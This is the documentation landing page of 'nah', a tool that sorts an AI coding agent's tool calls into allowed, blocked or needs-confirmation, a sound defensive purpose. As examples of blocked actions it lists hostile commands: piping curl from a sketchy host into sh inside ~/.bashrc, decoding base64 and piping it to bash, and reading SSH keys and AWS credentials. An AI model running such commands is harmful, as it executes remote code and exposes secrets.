<style>.md-content h1 { display: none; }</style>

<p align="center">
  <img src="assets/logo.png" alt="nah" width="280" class="invertible">
</p>

<p align="center">
  <strong>A permission system you control.</strong><br>
  Because allow-or-deny isn't enough.
</p>

---

`git push` — Sure.<br>
`git push --force` — **nah?**

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah.**

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.ssh/id_rsa` — **nah.**

**Write** `./config.yaml` — Fine.<br>
**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**

---

`nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

## Quick install

```bash
pip install nah
nah install
```

## What does it look like?

```
Claude: Edit → ~/.claude/hooks/nah_guard.py
  nah. Edit targets hook directory (self-modification blocked)

Claude: Read → ~/.aws/credentials
  nah? Read targets sensitive path: ~/.aws

Claude: Bash → npm test
  ✓ allowed (package_run)

Claude: Bash → base64 -d payload | bash
  nah. obfuscated execution: bash receives decoded input
```

**`nah.`** = blocked. **`nah?`** = asks for confirmation. Everything else flows through silently.

## What it guards

| Tool | What nah checks |
|------|----------------|
| **Bash** | Structural classification — action type, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
| **Edit** | Path check + project boundary + content inspection on the replacement string |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |
| **MCP** | Generic classification for third-party tool servers |

---

[Install](install.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Getting started](guides/getting-started.md)
